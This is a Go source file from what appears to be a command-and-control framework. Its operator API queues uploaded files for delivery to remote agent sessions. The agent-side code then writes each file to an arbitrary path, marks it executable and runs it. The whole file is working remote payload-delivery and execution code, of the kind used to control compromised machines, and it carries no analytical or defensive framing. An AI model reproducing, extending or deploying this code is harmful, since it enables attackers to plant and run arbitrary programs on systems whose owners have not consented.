package c2

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// FileDelivery represents a file to be written on the agent.
type FileDelivery struct {
	ID       string    `json:"id"`
	FileName string    `json:"file_name"`
	FilePath string    `json:"file_path"`
	Data     string    `json:"data"` // base64-encoded
	Execute  bool      `json:"execute"`
	Queued   time.Time `json:"queued"`
}

// DeployRequest is the operator API request to upload and optionally execute a file on an agent.
type DeployRequest struct {
	SessionID string `json:"session_id"`
	FilePath  string `json:"file_path"`
	Execute   bool   `json:"execute"`
}

// addDeployRoutes registers file delivery and deploy endpoints on the listener.
func (l *Listener) addDeployRoutes(mux *http.ServeMux) {
	// Operator API — upload file to agent
	mux.HandleFunc("/api/deploy", l.handleDeploy)

	// Operator API — list pending file deliveries
	mux.HandleFunc("/api/files", l.handleListFiles)
}

// handleDeploy accepts a multipart upload and queues file delivery to an agent.
func (l *Listener) handleDeploy(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST required", http.StatusMethodNotAllowed)
		return
	}

	// Parse multipart form — 50MB max
	if err := r.ParseMultipartForm(50 << 20); err != nil {
		http.Error(w, "parse form: "+err.Error(), http.StatusBadRequest)
		return
	}

	sessionID := r.FormValue("session_id")
	filePath := r.FormValue("file_path")
	execute := r.FormValue("execute") == "true"

	if sessionID == "" || filePath == "" {
		http.Error(w, "session_id and file_path required", http.StatusBadRequest)
		return
	}

	l.mu.RLock()
	_, exists := l.sessions[sessionID]
	l.mu.RUnlock()
	if !exists {
		http.Error(w, "session not found", http.StatusNotFound)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "file field required: "+err.Error(), http.StatusBadRequest)
		return
	}
	defer file.Close()

	data, err := io.ReadAll(io.LimitReader(file, 50<<20))
	if err != nil {
		http.Error(w, "read file: "+err.Error(), http.StatusInternalServerError)
		return
	}

	b := make([]byte, 8)
	rand.Read(b)
	deliveryID := hex.EncodeToString(b)

	delivery := FileDelivery{
		ID:       deliveryID,
		FileName: header.Filename,
		FilePath: filePath,
		Data:     base64.StdEncoding.EncodeToString(data),
		Execute:  execute,
		Queued:   time.Now(),
	}

	l.mu.Lock()
	l.files[sessionID] = append(l.files[sessionID], delivery)
	l.mu.Unlock()

	fmt.Printf("[*] Queued file delivery %s for session %s: %s (%d bytes, execute=%v)\n",
		deliveryID[:8], sessionID[:8], header.Filename, len(data), execute)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":      "queued",
		"delivery_id": deliveryID,
		"file_name":   header.Filename,
		"file_path":   filePath,
		"size":        len(data),
		"execute":     execute,
	})
}

// handleListFiles returns pending file deliveries for all sessions.
func (l *Listener) handleListFiles(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET required", http.StatusMethodNotAllowed)
		return
	}

	l.mu.RLock()
	pending := make(map[string]int)
	for sid, files := range l.files {
		if len(files) > 0 {
			pending[sid] = len(files)
		}
	}
	l.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(pending)
}

// drainFiles returns and removes pending file deliveries for a session.
func (l *Listener) drainFiles(sessionID string) []FileDelivery {
	l.mu.Lock()
	defer l.mu.Unlock()

	files, ok := l.files[sessionID]
	if !ok || len(files) == 0 {
		return nil
	}
	delete(l.files, sessionID)
	return files
}

// handleFileDeliveries processes file deliveries on the agent side.
func handleFileDeliveries(deliveries []FileDelivery) {
	for _, d := range deliveries {
		data, err := base64.StdEncoding.DecodeString(d.Data)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] decode file %s: %v\n", d.FileName, err)
			continue
		}

		// Ensure parent directory exists
		dir := filepath.Dir(d.FilePath)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			fmt.Fprintf(os.Stderr, "[!] mkdir %s: %v\n", dir, err)
			continue
		}

		// Write file
		perm := os.FileMode(0o644)
		if d.Execute {
			perm = 0o755
		}
		if err := os.WriteFile(d.FilePath, data, perm); err != nil {
			fmt.Fprintf(os.Stderr, "[!] write %s: %v\n", d.FilePath, err)
			continue
		}
		fmt.Printf("[+] File written: %s (%d bytes)\n", d.FilePath, len(data))

		// Execute if requested
		if d.Execute {
			fmt.Printf("[*] Executing: %s\n", d.FilePath)
			result := executeCommand(QueuedCommand{
				ID:      d.ID,
				Command: d.FilePath,
			})
			fmt.Printf("[*] Execute result (exit=%d): %s\n", result.ExitCode, result.Output)
		}
	}
}
